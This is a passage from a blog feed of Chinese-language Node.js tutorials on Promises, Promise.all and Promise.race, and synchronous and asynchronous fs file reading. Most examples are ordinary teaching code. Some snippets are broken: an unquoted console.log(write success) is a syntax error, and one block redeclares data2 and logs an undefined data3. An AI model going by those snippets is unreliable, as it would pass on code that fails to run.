id="解决异步调用问题"><a href="#解决异步调用问题" class="headerlink" title="解决异步调用问题"></a>解决异步调用问题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  fs.readFile(<span class="string">'./data/01.txt'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> reject(err);</span><br><span class="line">    &#125;</span><br><span class="line">    resolve(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  fs.readFile(<span class="string">'./data/02.txt'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> reject(err);</span><br><span class="line">    &#125;</span><br><span class="line">    resolve(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> p3 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  fs.readFile(<span class="string">'./data/03.txt'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> reject(err);</span><br><span class="line">    &#125;</span><br><span class="line">    resolve(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">p1.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">  <span class="keyword">return</span> p2;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 当前这个 then 里面的回调函数的参数，就是上一个 then 中回调函数的返回值</span></span><br><span class="line">  <span class="comment">// 该返回值有 3 种情况，</span></span><br><span class="line">  <span class="comment">//    1， 没有返回值就是 undefined</span></span><br><span class="line">  <span class="comment">//    2.  手动的 return 普通值</span></span><br><span class="line">  <span class="comment">//    3.  返回一个新的 Promise 对象</span></span><br><span class="line">  <span class="comment">//        如果是 Promise 对象，那么当前 then 就是 该 Promise 对象 resolve 函数的结果</span></span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">  <span class="keyword">return</span> p3;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 当前这个catch 方法就可以把之前所有的任务中可能出现的异常都捕获</span></span><br><span class="line">  <span class="comment">// 甚至包括 then 函数中的异常也可以捕获到</span></span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>封装 Promise 版本的读取文件方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">filePath, encoding</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(filePath, encoding, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">readFile(<span class="string">'./data/01.txt'</span>, <span class="string">'utf8'</span>)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">  <span class="keyword">return</span> readFile(<span class="string">'./data/02.txt'</span>, <span class="string">'utf8'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">  <span class="keyword">return</span> readFile(<span class="string">'./data/03.txt'</span>, <span class="string">'utf8'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>封装 Promise 版本的读写文件方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(filePath, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params">filePath, data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.writeFile(filePath, data, err =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">readFile(<span class="string">'./data/01.txt'</span>)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> writeFile(<span class="string">'./data/01copy.txt'</span>, data);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(write success);</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h3><p>Promise.all方法用于将多个Promise实例，包装成一个新的Promise实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">Promise</span>.all([p1, p2, p3]);</span><br><span class="line">p.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data); <span class="comment">// data 是一个数组</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Promise.all方法接受一个数组作为参数，p1、p2、p3都是Promise对象的实例。</p><p>p的状态由p1、p2、p3决定，分成两种情况：</p><ul><li><p>只有p1、p2、p3的状态都变成fulfilled ，p的状态才会变成fulfilled</p><ul><li>此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。</li></ul></li><li><p>只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected</p><ul><li>此时第一个被reject的实例的返回值，会传递给p的回调函数。<br>封装异步并行读取文件 Promise 的另外一个版本</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(filePath, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Promise 构造函数的 all() 方法接收一个每个元素都是 Promise 对象的数组</span></span><br><span class="line"><span class="comment">// 返回结果也是 Promise 对象</span></span><br><span class="line"><span class="comment">// Promise 专门用来解决回调地狱的，也可以做异步流程控制</span></span><br><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">  readFile(<span class="string">'./data/01.txt'</span>), </span><br><span class="line">  readFile(<span class="string">'./data/02.txt'</span>), </span><br><span class="line">  readFile(<span class="string">'./data/03.txt'</span>)</span><br><span class="line">]).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data[<span class="number">0</span>].toString());</span><br><span class="line">  <span class="built_in">console</span>.log(data[<span class="number">1</span>].toString());</span><br><span class="line">  <span class="built_in">console</span>.log(data[<span class="number">2</span>].toString());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="以读文件为例子，封装-Promise-API："><a href="#以读文件为例子，封装-Promise-API：" class="headerlink" title="以读文件为例子，封装 Promise API："></a>以读文件为例子，封装 Promise API：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(filePath, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 提供一个方法，该方法接收一个数组，数组中的指定要读取的文件路径，个数不定</span></span><br><span class="line"><span class="comment">// 当所有文件读取到的时候，将读取到的所有文件的结果返回</span></span><br><span class="line"><span class="comment">// getAll(['./data/01.txt', './data/02.txt', './data/03.txt']).then().catch()</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params">filePaths</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.all(filePaths.map(<span class="function"><span class="params">filePath</span> =&gt;</span> readFile(filePath)));</span><br><span class="line">&#125;</span><br><span class="line">getAll([</span><br><span class="line">  <span class="string">'./data/01.txt'</span>, </span><br><span class="line">  <span class="string">'./data/02.txt'</span>, </span><br><span class="line">  <span class="string">'./data/03.txt'</span></span><br><span class="line">]).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data[<span class="number">0</span>].toString());</span><br><span class="line">  <span class="built_in">console</span>.log(data[<span class="number">1</span>].toString());</span><br><span class="line">  <span class="built_in">console</span>.log(data[<span class="number">2</span>].toString());</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件失败'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h3><p>Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">Promise</span>.race([p1,p2,p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的Promise实例的返回值，就传递给p的回调函数。</p><p>并行执行一系列的异步任务，只要有一个异步任务完成，那业务就完成。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(filePath, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 谁先完成得到谁的数据</span></span><br><span class="line"><span class="built_in">Promise</span>.race([readFile(<span class="string">'./data/01.txt'</span>), readFile(<span class="string">'./data/02.txt'</span>)])</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data.toString());</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个 promise 在在代码中体现出来就是一个对象，该对象一般保存一个异步执行的任务。&lt;/p&gt;
&lt;p&gt;Promise是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6将其写进了语言标准，统一了用法，原生提供了 &lt;code&gt;Promise&lt;/code&gt; 对象。表示是一个未来的事情，可能做到，也可能失败。 Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。&lt;/p&gt;
&lt;h2 id=&quot;Promise-对象&quot;&gt;&lt;a href=&quot;#Promise-对象&quot; class=&quot;headerlink&quot; title=&quot;Promise 对象&quot;&gt;&lt;/a&gt;Promise 对象&lt;/h2&gt;&lt;p&gt;从语法上说，Promise是一个对象，从它可以获取异步操作的结果。&lt;/p&gt;
    
    </summary>
    
      <category term="Node.js" scheme="http://yoursite.com/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Node-文件操作（上）-简单封装复制文件方法、process对象</title>
    <link href="http://yoursite.com/2016/11/11/Node-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%88%E4%B8%8A%EF%BC%89-%E7%AE%80%E5%8D%95%E5%B0%81%E8%A3%85%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%E3%80%81process%E5%AF%B9%E8%B1%A1/"/>
    <id>http://yoursite.com/2016/11/11/Node-文件操作（上）-简单封装复制文件方法、process对象/</id>
    <published>2016-11-10T16:00:00.000Z</published>
    <updated>2018-06-06T02:51:45.926Z</updated>
    
    <content type="html"><![CDATA[<p>fs 文件操作模块</p><p>Node 只在文件 IO 操作中，提供了同步调用和异步调用两种形式，fs 模块对文件的几乎所有操作都有同步和异步两种形式，两者可以结合使用，但是推荐能使用异步调用解决问题的情况下，少用同步调用。</p><p>例如：<code>readFile()</code> 和 <code>readFileSync()</code>。</p><h2 id="引入包"><a href="#引入包" class="headerlink" title="引入包"></a>引入包</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br></pre></td></tr></table></figure><h2 id="同步操作"><a href="#同步操作" class="headerlink" title="同步操作"></a>同步操作</h2><a id="more"></a><ul><li>同步代码会阻塞后续代码执行，效率低</li><li>同步 API 需要 try-catch 捕获异常</li><li>同步 API 优点代码符合思维逻辑，</li><li>按顺序执行，简单执行</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = fs.readFileSync(<span class="string">'./README.md'</span>, <span class="string">'utf8'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'读取文件失败'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同步读取文件的一个例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data1 = fs.readFileSync(<span class="string">'./01.txt'</span>, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">const</span> data2 = fs.readFileSync(<span class="string">'./02.txt'</span>, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">const</span> data2 = fs.readFileSync(<span class="string">'./03.txt'</span>, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'已完成所有数据的读取'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(data1, data2, data3);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'读取文件失败'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异步操作"><a href="#异步操作" class="headerlink" title="异步操作"></a>异步操作</h2><p>异步 API 往往伴随着一个回调函数用来接收，返回值或异常处理。</p><p>回调函数的参数中第一个参数一般都是一个 err 对象，用来判定异步 API 是否发生异常。</p><ul><li>异步 API 即便没有捕获异常也不会主动抛出异常</li><li>异步 API，无法通过 try-catch 捕获异常</li></ul><p>一般文件操作中，所有的异步 API，都会在回调函数中提供一个 error 对象</p><ul><li>如果操作过程中有异常，则 error 是一个异常对象</li><li>如果操作成功，没有问题，则 error 是一个 null</li><li>所以，为了判定是否有异常，if (err) {// 处理异常}</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.readFile(<span class="string">"./data/01.txt"</span>,<span class="string">"utf8"</span>, (err, data1) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">"失败了"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(data1);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>异步操作中：</p><ul><li>开发阶段，使用 throw err 的形式抛出异常</li><li>目的是为了快速的定位代码的错误</li><li>如果是网站服务器中，这个就不会去 throw err，</li><li>一般会有异常处理机制</li><li>一般在生产环境，会处理异常，例如记录日志方便排查错误</li><li>throw err 会直接抛出异常，退出进程</li></ul><h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">// 开始做某一件事</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"做一件事"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"需要准备一些做这件事的必备品"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"找人帮我买必备品\n\n"</span>);</span><br><span class="line"><span class="comment">// 所有的异步任务都会等待其它的同步代码执行结束之后，才会开始执行</span></span><br><span class="line">fs.readFile(<span class="string">"./data/01.txt"</span>, <span class="string">"utf8"</span>, (err, data1) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"11111111---"</span>, data1);</span><br><span class="line">  fs.readFile(<span class="string">"./data/02.txt"</span>, <span class="string">"utf8"</span>, (err, data2) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"222222-----"</span>, data2);</span><br><span class="line">    fs.readFile(<span class="string">"./data/03.txt"</span>, <span class="string">"utf8"</span>, (err, data3) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"3333----"</span>, data3);</span><br><span class="line">      <span class="comment">// 器材备齐，可以做事了</span></span><br><span class="line">      doSomething (data1, data2, data3);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"先干点别的活"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"然后去睡一会"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"收拾收拾准备"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params">data1, data2, data3</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"ok, 器材已经准备齐全，可以做这件事了"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="封装准备器材的这个过程；"><a href="#封装准备器材的这个过程；" class="headerlink" title="封装准备器材的这个过程；"></a>封装准备器材的这个过程；</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">// 上面代码的封装</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ready</span>(<span class="params">doSomething</span>)</span>&#123;</span><br><span class="line">  fs.readFile(<span class="string">"./data/01.txt"</span>, <span class="string">"utf8"</span>, (err, data1) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"11111111---"</span>, data1);</span><br><span class="line">    fs.readFile(<span class="string">"./data/02.txt"</span>, <span class="string">"utf8"</span>, (err, data2) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      